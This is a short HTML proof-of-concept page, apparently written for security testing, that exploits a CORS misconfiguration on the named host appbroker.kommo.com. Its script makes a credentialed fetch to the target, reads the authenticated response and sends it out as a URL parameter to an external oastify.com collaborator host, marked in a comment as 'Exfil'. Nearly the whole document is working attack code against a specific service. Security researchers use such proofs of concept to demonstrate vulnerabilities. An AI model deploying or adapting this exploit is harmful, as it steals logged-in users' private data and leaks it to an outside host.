<!DOCTYPE html>
<html>
  <head>
    <title>CORS PoC - appbroker.kommo.com</title>
  </head>
  <body>
    <h1>Testing CORS misconfig on appbroker.kommo.com</h1>
    <script>
      fetch("https://appbroker.kommo.com", {
        credentials: "include"
      })
      .then(res => res.text())
      .then(data => {
        // Log to browser console
        console.log("Response from target:", data);
        
        // Exfil using GET (safe, visible in webhook)
        fetch("https://98fmj9799dt6rel0erofj1cqshy8myan.oastify.com?leak=" + encodeURIComponent(data), {
          method: "GET",
          mode: "no-cors"
        });
      })
      .catch(err => {
        console.error("Error:", err);
      });
    </script>
  </body>
</html>
